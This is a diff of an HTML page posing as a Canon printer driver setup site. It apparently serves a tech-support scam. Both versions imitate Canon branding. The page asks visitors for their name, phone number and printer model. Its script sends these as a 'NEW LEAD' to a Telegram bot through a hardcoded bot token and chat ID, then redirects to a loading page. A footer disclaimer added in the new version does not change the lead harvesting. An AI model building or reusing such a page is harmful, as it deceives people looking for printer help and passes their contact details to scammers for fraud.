@@ -3,324 +3,302 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Canon Printer Setup - Select Your Operating System</title>
+    <title>Printer Setup</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: "Helvetica Neue", Arial, sans-serif;
-            background: #f8f8f8;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
+        /* RESET & FONTS */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
+        body { background-color: #f9f9f9; color: #333; min-height: 100vh; display: flex; flex-direction: column; }
 
-        /* CANON RED HEADER - Exact official style */
-        .header {
-            background: #cc0000;
-            color: white;
-            padding: 18px 0;
+        /* --- PROFESSIONAL HEADER --- */
+        header {
+            background-color: #cc0000; /* Canon Red */
+            height: 85px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            display: flex;
+            align-items: center;
+            position: relative;
+            z-index: 10;
         }
-        .header-content {
+        .header-inner {
+            width: 100%;
             max-width: 1200px;
             margin: 0 auto;
-            padding: 0 20px;
+            padding: 0 30px;
             display: flex;
-            align-items: center;
             justify-content: space-between;
+            align-items: center;
         }
-        .logo {
-            font-size: 28px;
-            font-weight: 900;
-            letter-spacing: -0.5px;
-        }
-        .header-text {
-            font-size: 16px;
-            font-weight: 500;
-            opacity: 0.95;
-        }
-
-        /* Main Content */
-        .main-content {
-            flex: 1;
+        
+        /* Left: Logo Area */
+        .brand-group {
             display: flex;
             align-items: center;
-            justify-content: center;
-            padding: 30px 20px;
+            gap: 12px;
+            color: white;
         }
-        .container {
-            background: white;
-            padding: 50px 40px;
-            border-radius: 16px;
-            box-shadow: 0 15px 40px rgba(0,0,0,0.12);
-            text-align: center;
-            max-width: 900px;
-            width: 100%;
+        .brand-icon { font-size: 32px; }
+        .brand-text { font-size: 28px; font-weight: 700; letter-spacing: 0.5px; }
+        
+        /* Right: Trust/Help Area */
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: white;
+            background: rgba(255,255,255,0.1);
+            padding: 10px 20px;
+            border-radius: 50px;
+            border: 1px solid rgba(255,255,255,0.2);
         }
-        h1 {
-            font-size: 36px;
-            color: #cc0000;
-            margin-bottom: 16px;
-            font-weight: 700;
-        }
-        .subtitle {
-            font-size: 20px;
-            color: #444;
-            margin-bottom: 40px;
+        .help-text { font-size: 16px; font-weight: 600; }
+        .help-icon { font-size: 18px; }
+
+        /* --- MAIN CONTENT --- */
+        .main-container {
+            flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center;
+            padding: 60px 20px; text-align: center;
         }
 
-        /* OS Cards - Canon style */
-        .os-grid {
-            display: flex;
-            justify-content: center;
-            gap: 40px;
-            flex-wrap: wrap;
+        h1 { font-size: 42px; color: #222; margin-bottom: 15px; font-weight: 800; }
+        p.subtitle { font-size: 24px; color: #555; margin-bottom: 60px; max-width: 700px; line-height: 1.4; }
+
+        /* CARDS CONTAINER */
+        .os-container {
+            display: flex; gap: 50px; flex-wrap: wrap; justify-content: center;
         }
+
+        /* CARD STYLE */
         .os-card {
             background: #fff;
-            border: 3px solid #eee;
+            width: 320px;
+            padding: 40px 20px;
+            border: 3px solid #e0e0e0;
             border-radius: 16px;
-            padding: 32px 24px;
-            width: 220px;
             cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.08);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
+        
         .os-card:hover {
             border-color: #cc0000;
-            transform: translateY(-8px);
+            transform: translateY(-10px);
             box-shadow: 0 20px 40px rgba(204,0,0,0.15);
         }
-        .os-card.selected {
-            border-color: #cc0000;
-            background: #fff5f5;
-        }
-        .os-figure {
-            width: 100px;
-            height: 100px;
-            margin: 0 auto 16px;
-        }
-        .os-figure img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-        }
-        .os-name {
-            font-size: 24px;
-            font-weight: 700;
-            color: #333;
+
+        .os-icon-img { 
+            width: 110px; height: 110px; margin-bottom: 25px; 
+            object-fit: contain; filter: drop-shadow(0 5px 5px rgba(0,0,0,0.1));
         }
 
-        /* Modal - Canon style */
+        .os-title { font-size: 28px; font-weight: 700; color: #333; margin-bottom: 10px; }
+        .click-hint { 
+            font-size: 18px; color: #fff; background: #cc0000; 
+            padding: 10px 30px; border-radius: 50px; font-weight: 600;
+            margin-top: 15px;
+        }
+
+        /* --- MODAL --- */
         .modal {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.6);
-            z-index: 1000;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8); z-index: 1000; justify-content: center; align-items: center;
+            backdrop-filter: blur(5px);
         }
         .modal-content {
-            background: white;
-            padding: 50px 40px;
-            border-radius: 20px;
-            max-width: 560px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 25px 60px rgba(0,0,0,0.3);
-            border-top: 6px solid #cc0000;
+            background: white; width: 95%; max-width: 500px;
+            border-radius: 16px; overflow: hidden; box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+            border-top: 8px solid #cc0000;
+            animation: slideUp 0.3s ease-out;
         }
-        .modal h2 {
-            font-size: 34px;
-            color: #cc0000;
-            margin-bottom: 16px;
+        @keyframes slideUp { from {transform: translateY(50px); opacity:0;} to {transform: translateY(0); opacity:1;} }
+        
+        .modal-header { padding: 30px 30px 10px; text-align: center; }
+        .modal-header h3 { font-size: 32px; color: #cc0000; margin: 0; font-weight: 800; }
+        
+        .modal-body { padding: 30px 40px 40px; }
+        .input-box { margin-bottom: 25px; }
+        .input-box label { display: block; font-size: 18px; font-weight: 600; margin-bottom: 8px; color: #444; }
+        .input-box input {
+            width: 100%; padding: 18px; border: 2px solid #ccc; border-radius: 8px; font-size: 20px;
+            background: #fdfdfd; transition: 0.2s;
         }
-        .modal p {
-            font-size: 20px;
-            color: #444;
-            margin-bottom: 32px;
+        .input-box input:focus { border-color: #cc0000; outline: none; background: #fff; }
+
+        .submit-btn {
+            width: 100%; background: #cc0000; color: white; padding: 22px; border: none;
+            font-size: 24px; font-weight: 700; border-radius: 8px; cursor: pointer;
+            box-shadow: 0 5px 15px rgba(204,0,0,0.3); transition: 0.2s;
         }
-        .form-group {
-            margin-bottom: 28px;
-            text-align: left;
-        }
-        label {
-            display: block;
-            font-size: 22px;
-            font-weight: 600;
-            margin-bottom: 12px;
-            color: #333;
-        }
-        input {
-            width: 100%;
-            padding: 18px;
-            font-size: 22px;
-            border: 2px solid #ddd;
-            border-radius: 12px;
-            background: #fafafa;
-        }
-        input:focus {
-            outline: none;
-            border-color: #cc0000;
-            box-shadow: 0 0 0 4px rgba(204,0,0,0.15);
+        .submit-btn:hover { background: #aa0000; transform: scale(1.02); }
+        .cancel-btn { 
+            display: block; text-align: center; margin-top: 20px; font-size: 18px; color: #888; cursor: pointer; text-decoration: underline;
         }
 
-        .btn-row {
-            display: flex;
-            gap: 20px;
-            justify-content: center;
-            margin-top: 30px;
-        }
-        .btn {
-            padding: 18px 40px;
-            font-size: 24px;
-            font-weight: 700;
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            min-width: 180px;
-        }
-        .btn-primary {
-            background: #cc0000;
-            color: white;
-        }
-        .btn-primary:hover { background: #b00000; }
-        .btn-cancel {
-            background: #666;
-            color: white;
-        }
-
+        /* --- PROFESSIONAL FOOTER --- */
         footer {
-            background: #111;
+            background-color: #1a1a1a;
             color: #ccc;
+            padding: 50px 20px;
+            border-top: 5px solid #cc0000;
+        }
+        .footer-content {
+            max-width: 1000px;
+            margin: 0 auto;
             text-align: center;
-            padding: 20px;
-            font-size: 15px;
+        }
+        .footer-links {
+            margin-bottom: 20px;
+        }
+        .footer-links a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 15px;
+            font-size: 16px;
+            font-weight: 600;
+        }
+        .footer-links a:hover { color: #cc0000; text-decoration: underline; }
+        
+        .disclaimer-text {
+            font-size: 14px;
+            color: #777;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            border-top: 1px solid #333;
+            padding-top: 20px;
+        }
+        .copyright { font-size: 14px; color: #aaa; }
+
+        /* Responsive */
+        @media(max-width: 768px) {
+            .header-right { display: none; } /* Hide 'Help' on small mobile to keep header clean */
+            h1 { font-size: 32px; }
+            .os-card { width: 100%; max-width: 350px; }
         }
     </style>
     <script src="//code.jivosite.com/widget/kmQyW9kmtz" async></script>
 </head>
 <body>
 
-<!-- CANON RED HEADER -->
-<header class="header">
-    <div class="header-content">
-        <div style="display:flex; align-items:center; gap:16px;">
-            <div style="width:48px; height:48px; background:#fff; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:28px; color:#cc0000; font-weight:900;">
-                C
+    <header>
+        <div class="header-inner">
+            <div class="brand-group">
+                <i class="fas fa-print brand-icon"></i>
+                <span class="brand-text">Printer Setup</span>
             </div>
-            <div>
-                <div class="logo">Canon</div>
-                <div class="header-text">Printer Setup & Driver Installation</div>
+            <div class="header-right">
+                <i class="fas fa-shield-alt help-icon"></i>
+                <span class="help-text">Secure Guide</span>
+            </div>
+        </div>
+    </header>
+
+    <div class="main-container">
+        
+        <h1>Select Your Computer</h1>
+        <p class="subtitle">To begin the driver installation, please click on your computer type below.</p>
+
+        <div class="os-container">
+            <div class="os-card" onclick="openForm('Windows')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Windows_logo_-_2021.svg" alt="Windows Logo" class="os-icon-img">
+                <div class="os-title">Windows PC</div>
+                <div class="click-hint">Click to Start</div>
+            </div>
+
+            <div class="os-card" onclick="openForm('macOS')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Mac Logo" class="os-icon-img">
+                <div class="os-title">Apple Mac</div>
+                <div class="click-hint">Click to Start</div>
+            </div>
+        </div>
+
+    </div>
+
+    <div id="setupModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Verify Setup</h3>
+            </div>
+            <div class="modal-body">
+                <div class="input-box">
+                    <label>Printer Model Number</label>
+                    <input type="text" id="model" placeholder="e.g. TR4520, MG3620">
+                </div>
+                <div class="input-box">
+                    <label>Your Full Name</label>
+                    <input type="text" id="name" placeholder="Enter Name">
+                </div>
+                <div class="input-box">
+                    <label>Phone Number</label>
+                    <input type="tel" id="phone" placeholder="Enter Phone Number">
+                </div>
+                <button class="submit-btn" onclick="submitData()">Start Download &gt;</button>
+                <div class="cancel-btn" onclick="closeForm()">Cancel</div>
             </div>
         </div>
     </div>
-</header>
 
-<main class="main-content">
-    <div class="container">
-        <h1>Select Your Operating System</h1>
-        <p class="subtitle">Click the one you are using</p>
-
-        <div class="os-grid">
-            <div class="os-card" data-os="windows">
-                <figure class="os-figure">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Windows_logo_-_2021.svg" alt="Windows">
-                </figure>
-                <div class="os-name">Windows</div>
+    <footer>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">Home</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Use</a>
+                <a href="#">Contact</a>
             </div>
-
-            <div class="os-card" data-os="mac">
-                <figure class="os-figure">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="macOS">
-                </figure>
-                <div class="os-name">macOS</div>
+            <div class="disclaimer-text">
+                <strong>Disclaimer:</strong> This website is an independent educational resource for printer configuration. We are not associated with, endorsed by, or sponsored by Canon Inc. or any other manufacturer. All brand names and trademarks are the property of their respective owners.
             </div>
-
-            <div class="os-card" data-os="chromebook">
-                <figure class="os-figure">
-                    <img src="https://www.svgrepo.com/show/378784/chrome-1-11.svg" alt="Chrome OS">
-                </figure>
-                <div class="os-name">Chrome OS</div>
+            <div class="copyright">
+                © 2025 Independent Printer Setup Guide. All rights reserved.
             </div>
         </div>
-    </div>
-</main>
+    </footer>
 
-<!-- MODAL FORM -->
-<div id="detailsModal" class="modal">
-    <div class="modal-content">
-        <h2>Enter Your Details</h2>
-        <p>We need this to find the correct Canon driver</p>
+    <script>
+        // Telegram Config
+        const BOT_TOKEN = "7764513169:AAFpRf8WQ6WE7DymOqMgTxXjv6BUSZe2734";
+        const CHAT_ID   = "1684000886";
+        let selectedOS = "";
 
-        <div class="form-group">
-            <label>Full Name</label>
-            <input type="text" id="userName" placeholder="e.g. John Smith" required>
-        </div>
-        <div class="form-group">
-            <label>Contact Number</label>
-            <input type="tel" id="contactNumber" placeholder="+1 98765 43210" required>
-        </div>
-        <div class="form-group">
-            <label>Printer Model</label>
-            <input type="text" id="modelNumber" placeholder="e.g. PIXMA MG3620" required>
-        </div>
-
-        <div class="btn-row">
-            <button type="button" class="btn btn-primary" id="submitBtn">Continue</button>
-            <button type="button" class="btn btn-cancel" id="btnCancel">Cancel</button>
-        </div>
-    </div>
-</div>
-
-<footer>
-    © 2025 Canon Printer Setup • Official Driver Installation
-</footer>
-
-<script>
-    let selectedOS = '';
-    const BOT_TOKEN = "7764513169:AAFpRf8WQ6WE7DymOqMgTxXjv6BUSZe2734";
-    const CHAT_ID   = "1684000886";
-
-    document.querySelectorAll('.os-card').forEach(card => {
-        card.addEventListener('click', () => {
-            document.querySelectorAll('.os-card').forEach(c => c.classList.remove('selected'));
-            card.classList.add('selected');
-            selectedOS = card.dataset.os;
-            setTimeout(() => document.getElementById('detailsModal').style.display = 'flex', 300);
-        });
-    });
-
-    document.getElementById('btnCancel').onclick = () => {
-        document.getElementById('detailsModal').style.display = 'none';
-        selectedOS = '';
-        document.querySelectorAll('.os-card').forEach(c => c.classList.remove('selected'));
-    };
-
-    document.getElementById('submitBtn').onclick = async () => {
-        const name = document.getElementById('userName').value.trim();
-        const phone = document.getElementById('contactNumber').value.trim();
-        const model = document.getElementById('modelNumber').value.trim();
-
-        if (!name || !phone || !model || !selectedOS) {
-            alert('Please fill all fields');
-            return;
+        function openForm(os) {
+            selectedOS = os;
+            document.getElementById('setupModal').style.display = 'flex';
         }
 
-        const os = selectedOS === 'mac' ? 'macOS' : selectedOS === 'windows' ? 'Windows' : 'Chrome OS';
-        const msg = `New Canon Lead\nName: ${name}\nPhone: ${phone}\nModel: ${model}\nOS: ${os}`;
+        function closeForm() {
+            document.getElementById('setupModal').style.display = 'none';
+        }
 
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
-        });
+        function submitData() {
+            const model = document.getElementById('model').value;
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
 
-        window.location.href = '/printer/loading.html';
-    };
-</script>
+            if(!model || !name || !phone) {
+                alert("Please fill in all boxes.");
+                return;
+            }
+
+            document.querySelector('.submit-btn').innerText = "Processing...";
+            document.querySelector('.submit-btn').style.background = "#555";
+
+            const msg = `🔴 NEW LEAD (Canon PRO)\n\n👤 Name: ${name}\n📱 Phone: ${phone}\n🖨 Model: ${model}\n💻 OS: ${selectedOS}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+            }).then(() => {
+                window.location.href = "/printer/loading.html";
+            }).catch(err => {
+                window.location.href = "/printer/loading.html";
+            });
+        }
+    </script>
 
 </body>
 </html>
